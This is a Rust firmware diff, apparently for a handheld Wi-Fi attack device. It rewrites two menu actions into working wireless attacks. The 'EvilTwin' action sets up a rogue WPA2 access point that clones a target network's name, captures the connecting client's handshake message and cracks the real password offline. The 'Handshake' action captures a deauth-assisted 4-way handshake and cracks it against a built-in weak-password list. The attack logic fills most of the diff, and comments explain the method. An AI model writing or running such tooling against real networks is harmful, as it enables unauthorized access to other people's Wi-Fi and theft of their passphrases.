@@ -600,6 +600,7 @@ fn main() -> ! {
     {
         crate::radio::http::networktest();
         crate::radio::camscan::networktest();
+        crate::radio::wpa::networktest();
     }
 
     loop {
@@ -1241,14 +1242,80 @@ fn main() -> ! {
                             }
                         }
                         hacking::Action::EvilTwin => {
-                            if let Some((ssid_buf, ssid_len, ch)) = hacking.target_ssid_owned() {
-                                let ssid = core::str::from_utf8(&ssid_buf[..ssid_len]).unwrap_or("");
-                                run_attack!(i18n::t(app::BEACONS), |tick| radio.beacon_spam(&[ssid], ch, tick));
+                            // EVIL TWIN = rogue WPA2 AP cloning the target SSID + sniff the
+                            // connecting client's msg2 (MIC from the REAL pass) -> crack offline.
+                            // Forces clients onto our 2.4 GHz AP, no deauth. See run_evil_twin.
+                            if let Some((sb, sl, ch)) = hacking.target_ssid_owned() {
+                                let ssid = core::str::from_utf8(&sb[..sl]).unwrap_or("");
+                                let title = hacking.attack_title();
+                                hacking.set_running();
+                                hacking::draw_running(&mut fbuf, title, "EAPOL", 0);
+                                blit!();
+                                let mut last = Instant::now();
+                                let res = radio.run_evil_twin(ssid, ch, "00000000", |n: u32| {
+                                    let mut stop = false;
+                                    while let Ok(Some(ev)) = tca8418::next_event(&mut i2c) {
+                                        if ev.pressed {
+                                            stop = true;
+                                        }
+                                    }
+                                    if g0.is_low() {
+                                        stop = true;
+                                    }
+                                    if stop {
+                                        return false;
+                                    }
+                                    if last.elapsed() >= Duration::from_millis(150) {
+                                        last = Instant::now();
+                                        hacking::draw_running(&mut fbuf, title, "EAPOL", n);
+                                        blit!();
+                                    }
+                                    true
+                                });
+                                g0_prev_low = g0.is_low();
+                                match res {
+                                    Some(o) => hacking.show_handshake(&mut fbuf, o.eapol, o.captured, o.cracked),
+                                    None => hacking.show_attack_failed(&mut fbuf, "radio busy"),
+                                }
                             }
                         }
                         hacking::Action::Handshake => {
-                            if let Some((bssid, ch)) = hacking.target() {
-                                run_attack!("EAPOL", |tick| radio.handshake_capture(bssid, ch, tick));
+                            // capture the 4-way handshake (deauth-assisted) then crack it
+                            // OFFLINE against the built-in weak list — see radio::handshake_crack.
+                            if let (Some((bssid, ch)), Some((sb, sl, _))) =
+                                (hacking.target(), hacking.target_ssid_owned())
+                            {
+                                let ssid = core::str::from_utf8(&sb[..sl]).unwrap_or("");
+                                let title = hacking.attack_title();
+                                hacking.set_running();
+                                hacking::draw_running(&mut fbuf, title, "EAPOL", 0);
+                                blit!();
+                                let mut last = Instant::now();
+                                let res = radio.handshake_crack(ssid, bssid, ch, |n: u32| {
+                                    let mut stop = false;
+                                    while let Ok(Some(ev)) = tca8418::next_event(&mut i2c) {
+                                        if ev.pressed {
+                                            stop = true;
+                                        }
+                                    }
+                                    if g0.is_low() {
+                                        stop = true;
+                                    }
+                                    if stop {
+                                        return false;
+                                    }
+                                    if last.elapsed() >= Duration::from_millis(150) {
+                                        last = Instant::now();
+                                        hacking::draw_running(&mut fbuf, title, "EAPOL", n);
+                                        blit!();
+                                    }
+                                    true
+                                });
+                                g0_prev_low = g0.is_low();
+                                match res {
+                                    Some(o) => hacking.show_handshake(&mut fbuf, o.eapol, o.captured, o.cracked),
+                                    None => hacking.show_attack_failed(&mut fbuf, "radio busy"),
+                                }
                             }
                         }
                         hacking::Action::Portal => {
